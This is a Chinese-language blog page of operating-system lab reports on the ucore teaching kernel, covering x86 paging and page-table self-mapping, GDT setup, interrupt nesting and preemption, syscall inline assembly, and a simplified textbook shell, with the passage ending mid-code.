<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// map all physical memory to linear memory with base linear addr KERNBASE</span></span><br><span class="line"><span class="comment">// linear_addr KERNBASE ~ KERNBASE + KMEMSIZE = phy_addr 0 ~ KMEMSIZE</span></span><br><span class="line">boot_map_segment(boot_pgdir, KERNBASE, KMEMSIZE, <span class="number">0</span>, PTE_W);</span><br><span class="line"></span><br><span class="line"><span class="comment">//boot_map_segment - setup&amp;enable the paging mechanism</span></span><br><span class="line"><span class="comment">// parameters</span></span><br><span class="line"><span class="comment">//  la:   linear address of this memory need to map (after x86 segment map)</span></span><br><span class="line"><span class="comment">//  size: memory size</span></span><br><span class="line"><span class="comment">//  pa:   physical address of this memory</span></span><br><span class="line"><span class="comment">//  perm: permission of this memory</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">boot_map_segment(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> la, <span class="keyword">size_t</span> size, <span class="keyword">uintptr_t</span> pa, <span class="keyword">uint32_t</span> perm) &#123;</span><br><span class="line">    <span class="keyword">size_t</span> n = ROUNDUP(size + PGOFF(la), PGSIZE) / PGSIZE;</span><br><span class="line">    la = ROUNDDOWN(la, PGSIZE);</span><br><span class="line">    pa = ROUNDDOWN(pa, PGSIZE);</span><br><span class="line">    <span class="keyword">for</span> (; n &gt; <span class="number">0</span>; n --, la += PGSIZE, pa += PGSIZE) &#123;</span><br><span class="line">        <span class="keyword">pte_t</span> *ptep = get_pte(pgdir, la, <span class="number">1</span>);</span><br><span class="line">        *ptep = pa | PTE_P | perm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>完成这个函数后 0x30000000<del>0x38000000 这段线性地址被映射到了物理地址 0x00000000</del>0x08000000</p>
<p>下面简单总结一下各个数据结构在内存中的位置：</p>
<ol>
<li>页目录表：占一页大小，在<code>entry.S</code>里被定义在了内核代码的数据段。</li>
<li>OS 管理页面结构数组 pages : 根据探测到的内存在 OS 代码结尾处进行分配。</li>
<li>页表：空闲内存中（pages 结束向上的空闲内存）</li>
</ol>
<p>再介绍下<code>get_pte</code>函数作为练习 2 的 lab</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pte_t</span> * <span class="title">get_pte</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> la, <span class="keyword">bool</span> create)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取传入的线性地址中所对应的页目录条目的物理地址</span></span><br><span class="line">    <span class="keyword">pde_t</span> *pdep = &amp;pgdir[PDX(la)];</span><br><span class="line">    <span class="comment">// 如果该条目不可用(not present)</span></span><br><span class="line">    <span class="keyword">if</span> (!(*pdep &amp; PTE_P)) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span>;</span></span><br><span class="line">        <span class="comment">// 如果分配页面失败，或者不允许分配，则返回NULL</span></span><br><span class="line">        <span class="comment">// alloc_page 返回的是pages数组中的page地址</span></span><br><span class="line">        <span class="keyword">if</span> (!create || (page = alloc_page()) == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">// 设置该物理页面的引用次数为1</span></span><br><span class="line">        set_page_ref(page, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 获取当前page所管理的物理地址</span></span><br><span class="line">        <span class="keyword">uintptr_t</span> pa = page2pa(page);</span><br><span class="line">        <span class="comment">// 清空该物理页面的数据。需要注意的是使用虚拟地址</span></span><br><span class="line">        <span class="built_in">memset</span>(KADDR(pa), <span class="number">0</span>, PGSIZE);</span><br><span class="line">        <span class="comment">// 将新分配的页面设置为当前缺失的页目录条目中</span></span><br><span class="line">        <span class="comment">// 之后该页面就是其中的一个二级页面</span></span><br><span class="line">        *pdep = pa | PTE_U | PTE_W | PTE_P;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回在pgdir中对应于la的二级页表项</span></span><br><span class="line">    <span class="keyword">return</span> &amp;((<span class="keyword">pte_t</span> *)KADDR(PDE_ADDR(*pdep)))[PTX(la)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="第四阶段"><a href="#第四阶段" class="headerlink" title="第四阶段"></a>第四阶段</h3><p>第四阶段为 pmm.c 的<code>gdt_init()</code>函数设置了新的段表，相比旧段表只有内核代码段和内核数据段增加了用户的代码和内核段。建立起了整个操作系统的内存模型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdt:</span><br><span class="line">    SEG_NULLASM                                     <span class="meta"># null seg</span></span><br><span class="line">    SEG_ASM(STA_X|STA_R, <span class="number">0x0</span>, <span class="number">0xffffffff</span>)           <span class="meta"># code seg for bootloader and kernel</span></span><br><span class="line">    SEG_ASM(STA_W, <span class="number">0x0</span>, <span class="number">0xffffffff</span>)                 <span class="meta"># data seg for bootloader and kernel</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* *</span></span><br><span class="line"><span class="comment"> * Global Descriptor Table:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The kernel and user segments are identical (except for the DPL). To load</span></span><br><span class="line"><span class="comment"> * the %ss register, the CPL must equal the DPL. Thus, we must duplicate the</span></span><br><span class="line"><span class="comment"> * segments for the user and the kernel. Defined as follows:</span></span><br><span class="line"><span class="comment"> *   - 0x0 :  unused (always faults -- for trapping NULL far pointers)</span></span><br><span class="line"><span class="comment"> *   - 0x8 :  kernel code segment</span></span><br><span class="line"><span class="comment"> *   - 0x10:  kernel data segment</span></span><br><span class="line"><span class="comment"> *   - 0x18:  user code segment</span></span><br><span class="line"><span class="comment"> *   - 0x20:  user data segment</span></span><br><span class="line"><span class="comment"> *   - 0x28:  defined for tss, initialized in gdt_init</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">segdesc</span> <span class="title">gdt</span>[] =</span> &#123;</span><br><span class="line">    SEG_NULL,</span><br><span class="line">    [SEG_KTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_KDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_UTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_UDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_TSS]   = SEG_NULL,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>经过了上面的四个阶段，下面根据这张图对内存地址的映射关系进行描述，因为在实验中我们设置了最大只能管理 896M 的内存（KMEMSIZE），所以整个物理地址空间只是从 0~896M。</p>
<p>首先从虚拟地址到线性地址的映射，该阶段由段表完成，阶段 1、4 设置了段表，但全是恒等映射，虚拟地址永远等于线性地址不变。两个阶段的不同之处只是在于阶段 4 增加了用户的代码数据段。</p>
<p>然后就是从线性地址到实际物理地址的映射，阶段 2 将线性地址 3G ~ 3G +4M 映射到物理地址 0 ~ 4M(在阶段 3 被保存了下来)。阶段 3 将线性地址 3G ~ 3G + 896M 映射到物理地址 0 ~ 896M。</p>
<p>一直到页表结束，空闲内存开始的地方的物理地址应该是 &lt; 4M 的，所以在这个实验中，所有的虚地址都是从 3G 以上开始，被映射到了 0 ~ 896M</p>
<h2 id="自映射机制"><a href="#自映射机制" class="headerlink" title="自映射机制"></a>自映射机制</h2><p>页表自映射的思想是，把所有的页表（4KB）放到连续的 4MB 虚拟地址 空间中，并且要求这段空间 4MB 对齐，这样，会有一张页表的内容与页目录的内容完全相同，从而节省了页目录的空间。代价则是需要从虚拟地址空间中分配出连续的 4MB 对齐的 4MB 的空间。</p>
<p><img src="https://md.lagrange.plus/uploads/upload_23d235bf830085755d6a490740448aca.png" alt="自映射"></p>
<p>自映射时的页表结构</p>
<p>上图中，页表和页目录都位于虚拟地址空间的连续内存中，换句话说，这 4MB 的页表可以对应到虚拟地址空间的一个 Table Frame 中。</p>
<p>我们采用上图中的术语描述所谓的自映射关系。</p>
<ol>
<li>页表位于 Table Frame x</li>
<li>Table Frame x 中的每个 4KB 大小的 Page Frame 0-1023 分别存储了页表的 Table 0-1023</li>
<li>页目录的 Entry 0-1023 也需要分别指向页表的 Table 0-1023。</li>
<li>Table x 指向了 Table Frame x。（注意这里的 x，是相同的 x）</li>
<li>Table x 中的页表项（Page Table Entry, PTE）0-1023，分别指向 Table Frame x 的 1024 个 Page Frame（4KB）,也就是 Table 0-1023（根据第【2】条）。</li>
<li>Table x 等价于页目录。页目录中的 Entry x 指向 Table x。这就被称为自映射，节省了页目录的 4KB 空间。</li>
</ol>
<p>就是说 Table x 和页目录里面的内容相同，既然相同，Table x 也不用进行分配，直接在 Entry x 填 page dictionary 就行。</p>
<p>所以可以观察到,OS 先将那个 Entry x 填上自己的地址，再进行页表的初始化操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// recursively insert boot_pgdir in itself</span></span><br><span class="line"><span class="comment">// to form a virtual page table at virtual address VPT</span></span><br><span class="line">boot_pgdir[PDX(VPT)] = PADDR(boot_pgdir) | PTE_P | PTE_W;</span><br><span class="line"></span><br><span class="line"><span class="comment">// map all physical memory to linear memory with base linear addr KERNBASE</span></span><br><span class="line"><span class="comment">// linear_addr KERNBASE ~ KERNBASE + KMEMSIZE = phy_addr 0 ~ KMEMSIZE</span></span><br><span class="line">boot_map_segment(boot_pgdir, KERNBASE, KMEMSIZE, <span class="number">0</span>, PTE_W);</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/24/Lab5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lagrange">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lagrange's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/24/Lab5/" class="post-title-link" itemprop="url">Lab5 实验报告</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-01-24 10:47:34" itemprop="dateCreated datePublished" datetime="2021-01-24T10:47:34Z">2021-01-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-23 00:28:07" itemprop="dateModified" datetime="2021-04-23T00:28:07Z">2021-04-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OS/" itemprop="url" rel="index"><span itemprop="name">OS</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Lab5"><a href="#Lab5" class="headerlink" title="Lab5"></a>Lab5</h1><h2 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h2><p>根据 8086 Intel 的官方说明书有：</p>
<p>When the processor performs a call to the exception- or interrupt-handler procedure（P198）:</p>
<ul>
<li>If the handler procedure is going to be executed at a numerically lower privilege level, a stack switch occurs.<br>When the stack switch occurs: 1. The segment selector and stack pointer for the stack to be used by the handler are obtained from the TSS for the currently executing task. On this new stack, the processor pushes the stack segment selector and stack pointer of the interrupted procedure. 2. The processor then saves the current state of the EFLAGS, CS, and EIP registers on the new stack (see Figures 6-4). 3. If an exception causes an error code to be saved, it is pushed on the new stack after the EIP value.</li>
<li>If the handler procedure is going to be executed at the same privilege level as the interrupted procedure:<ol>
<li>The processor saves the current state of the EFLAGS, CS, and EIP registers on the current stack (see Figures 6-4).</li>
<li>If an exception causes an error code to be saved, it is pushed on the current stack after the EIP value.</li>
</ol>
</li>
</ul>
<p><img src="https://md.lagrange.plus/uploads/upload_ce570f54cdbb580aa04a55e93e9d4991.png" alt="Figures 6-4"></p>
<p>也就是说只有跨 ring 的时候，CPU 才会从 TR 寄存器里找 TSS 切到对应的内核栈，否则就直接用当前的栈就行，所以可以允许嵌套的中断栈帧。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">trap(struct trapframe *tf) &#123;</span><br><span class="line">    <span class="comment">// dispatch based on what type of trap occurred</span></span><br><span class="line">    <span class="comment">// 向前面的实验兼容，基本用不到</span></span><br><span class="line">    <span class="keyword">if</span> (current == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        trap_dispatch(tf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// keep a trapframe chain in stack</span></span><br><span class="line">        struct trapframe *otf = current-&gt;tf;</span><br><span class="line">        current-&gt;tf = tf;</span><br><span class="line">        <span class="keyword">bool</span> in_kernel = trap_in_kernel(tf);</span><br><span class="line">        trap_dispatch(tf);</span><br><span class="line">        current-&gt;tf = otf;</span><br><span class="line">        <span class="keyword">if</span> (!in_kernel) &#123;</span><br><span class="line">            <span class="comment">// 该进程需要退出的话就退出</span></span><br><span class="line">            <span class="keyword">if</span> (current-&gt;flags &amp; PF_EXITING) &#123;</span><br><span class="line">                do_exit(-E_KILLED);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 需要调度的话就调度</span></span><br><span class="line">            <span class="keyword">if</span> (current-&gt;need_resched) &#123;</span><br><span class="line">                schedule();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ucore允许中断嵌套。如果是用户态，有可能会出现第一次中断从用户态蹦到内核态，第二次在内核态又引起了一次中断，第一次因为跨了 ring 被切换到内核栈里，第二次没有跨 ring 所以又在原来内核栈运行到的地方再压了一层中断帧，所以可以形成两个栈帧，trap_in_kernel 通过判断当前的被保存的CS段是否是 KERNEL_CS 来判断中断是否发生在内核。</p>
<p>其次这应该是一个递归结构，在第 n 层处理完中断后，把当前的中断设置为 n-1 层的中断，再判断一下是否需要调度，不需要的话就返回上面一层 trap 接着处理（这种判断只发生在用户态蹦到内核态的那次中断，因为只有那个时候CS段是用户的代码段，防止在内核的时候也被抢占，导致内核线程的竞争，内核态发生的中断直接蹦到上一层中断处理）。</p>
<p>这个结构同时也实现了进程的抢占，因为在 trap_dispatch 中，若引发时钟中断到100次，则会把 current-&gt;need_resched 修改为 1 ，当函数返回的时候就知道需要进行 schedule 让出时间片。</p>
<p>总结一下，其实下面 if 判断的执行条件很苛刻，大部分的中断处理只是不停递归的完成 trap 函数。只有当引发的是时钟中断，且次数到了 100 次，且是从内核返回用户态的时候。这个时候 ucore 可以清晰的知道该进程运行了较久时间，需要切时间片给其他进程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_kernel) &#123;</span><br><span class="line">    ……</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (current-&gt;need_resched) &#123;</span><br><span class="line">        schedule();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里表明了只有当进程在用户态执行到“任意”某处用户代码位置时发生了中断，且当前进程控制块成员变量 need_resched 为1（表示需要调度了）时，才会执行 shedule 函数。这实际上体现了对用户进程的可抢占性。如果没有第一行的 if 语句，那么就可以体现对内核代码的可抢占性。但如果要把这一行 if 语句去掉，我们就不得不实现对 ucore 中的所有全局变量的互斥访问操作，以防止所谓的 racecondition 现象，这样 ucore 的实现复杂度会增加不少。</p>
<p>首先在执行某进程A的用户代码时，出现了一个 trap (例如是一个外设产生的中断)，这个时候就会从进程A的用户态切换到内核态(过程(1))，并且保存好进程A的trapframe；当内核态处理中断时发现需要进行进程切换时，ucore要通过schedule函数选择下一个将占用CPU执行的进程（即进程B），然后会调用proc_run函数，proc_run函数进一步调用switch_to函数，切换到进程B的内核态(过程(2))，继续进程B上一次在内核态的操作，并通过iret指令，最终将执行权转交给进程B的用户空间(过程(3))。</p>
<p>当进程B由于某种原因发生中断之后(过程(4))，会从进程B的用户态切换到内核态，并且保存好进程B的trapframe；当内核态处理中断时发现需要进行进程切换时，即需要切换到进程A，ucore再次切换到进程A(过程(5))，会执行进程A上一次在内核调用schedule (具体还要跟踪到 switch_to 函数)函数返回后的下一行代码，这行代码当然还是在进程A的上一次中断处理流程中。最后当进程A的中断处理完毕的时候，执行权又会反交给进程A的用户代码(过程(6))。这就是在只有两个进程的情况下，进程切换间的大体流程。</p>
<h2 id="GCC-内联汇编"><a href="#GCC-内联汇编" class="headerlink" title="GCC 内联汇编"></a>GCC 内联汇编</h2><blockquote>
<p>GCC 序号占位符介绍: GCC 规定，一个内联汇编语句中最多只能有 10 个 Input/Output 操作表达式,这些操作表达式按照他们被列出来的顺序依次赋予编号 0 到 9;对于占位符中的数字而言,与这些编号是对应的;比如:占位符%0 对应编号为 0 的操作表达式,占位符%1 对应编号为 1 的操作表达式,依次类推;GCC 对占位符进行编译的时候,会将每一个占位符替换为对应的 Input/Output 操作表达式所指定的寄存器/内存/立即数;</p>
</blockquote>
<p>例如:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__asm__(<span class="string">&quot;addl %1,%0\n\t&quot;</span>:<span class="string">&quot;=a&quot;</span>(__out):<span class="string">&quot;m&quot;</span>(__in1),<span class="string">&quot;a&quot;</span>(__in2));</span><br></pre></td></tr></table></figure>
<p>这个语句中,<code>%0</code>对应 Output 操作表达式<code>&quot;=a&quot;(__out)</code>,而<code>&quot;=a&quot;(__out)</code>指定的寄存器是<code>%eax</code>,所以,占位符<code>%0</code>被替换为<code>%eax</code>;占位符<code>%1</code>对应 Input 操作表达式<code>&quot;m&quot;(__in1)</code>,而<code>&quot;m&quot;(__in1)</code>被指定为内存,所以,占位符<code>%1</code>被替换位<code>__in1</code>的内存地址;<br>用一句话描述:序号占位符就是前面描述的<code>%0、%1、%2、%3、%4、%5、%6、%7、%8、%9</code>;其中,每一个占位符对应一个 Input/Output 的 C/C++表达式;</p>
<p>根据上面的背景知识，可以知道下面 uCore 用来进行系统调用的内联汇编的具体含义。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel_execve - do SYS_exec syscall to exec a user program called by user_main kernel_thread</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">kernel_execve(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">unsigned</span> <span class="keyword">char</span> *binary, <span class="keyword">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> ret, len = <span class="built_in">strlen</span>(name);</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;int %1;&quot;</span> <span class="comment">// %1对应第2个Input/Output操作表达式（从0开始数）,第一个是输出，第二个就是第一个输入（使用立即数的T_SYSCALL）</span></span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">&quot;=a&quot;</span>(ret) <span class="comment">//等号(=)说明圆括号中的表达式是一个只写的表达式,只能被用作当前内联汇编语句的输出,而不能作为输入。中断结束后返回值放在eax 转交给ret</span></span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">&quot;i&quot;</span>(T_SYSCALL), <span class="string">&quot;0&quot;</span>(SYS_exec), <span class="string">&quot;d&quot;</span>(name), <span class="string">&quot;c&quot;</span>(len), <span class="string">&quot;b&quot;</span>(binary), <span class="string">&quot;D&quot;</span>(size)</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="comment">//i:表示使用一个整数类型的立即数     edx         ecx        ebx           edi</span></span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="comment">//0表示第一个表达式（output）用的寄存器就是eax</span></span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">&quot;memory&quot;</span>)</span></span>; <span class="comment">//对内存做了改动</span></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过引发 int 0x80 中断，并将中断调用号存入<code>%eax</code>,从而在 trap_dispatch 中的 switch 语句中进入 syscall() 调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">syscall(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span> =</span> current-&gt;tf;</span><br><span class="line">    <span class="keyword">uint32_t</span> arg[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">int</span> num = tf-&gt;tf_regs.reg_eax;</span><br><span class="line">    <span class="keyword">if</span> (num &gt;= <span class="number">0</span> &amp;&amp; num &lt; NUM_SYSCALLS) &#123;</span><br><span class="line">        <span class="keyword">if</span> (syscalls[num] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            arg[<span class="number">0</span>] = tf-&gt;tf_regs.reg_edx;</span><br><span class="line">            arg[<span class="number">1</span>] = tf-&gt;tf_regs.reg_ecx;</span><br><span class="line">            arg[<span class="number">2</span>] = tf-&gt;tf_regs.reg_ebx;</span><br><span class="line">            arg[<span class="number">3</span>] = tf-&gt;tf_regs.reg_edi;</span><br><span class="line">            arg[<span class="number">4</span>] = tf-&gt;tf_regs.reg_esi;</span><br><span class="line">            <span class="comment">//传入参数调用，并把返回值放在 reg_eax 中</span></span><br><span class="line">            tf-&gt;tf_regs.reg_eax = syscalls[num](arg);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="exec-fork"><a href="#exec-fork" class="headerlink" title="exec / fork"></a>exec / fork</h2><h3 id="shell-原理"><a href="#shell-原理" class="headerlink" title="shell 原理"></a>shell 原理</h3><p>这是一份 shell 的简化版代码(CSAPP:524)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE]; <span class="comment">/* Command line */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Read */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        <span class="comment">//获取命令行输入</span></span><br><span class="line">        Fgets(cmdline, MAXLINE, <span class="built_in">stdin</span>);</span><br><span class="line">        <span class="keyword">if</span> (feof(<span class="built_in">stdin</span>))</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Evaluate */</span></span><br><span class="line">        eval(cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end shellmain */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* $begin eval */</span></span><br><span class="line"><span class="comment">/* eval - Evaluate a command line */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[MAXARGS]; <span class="comment">/* Argument list execve() */</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];   <span class="comment">/* Holds modified command line */</span></span><br><span class="line">    <span class="comment">// 是否以 &amp; 结尾</span></span><br><span class="line">    <span class="keyword">int</span> bg;    <span class="comment">/* Should the job run in bg or fg? */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid; <span class="comment">/* Process id */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    bg = parseline(buf, argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!builtin_command(argv))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((pid = Fork()) == <span 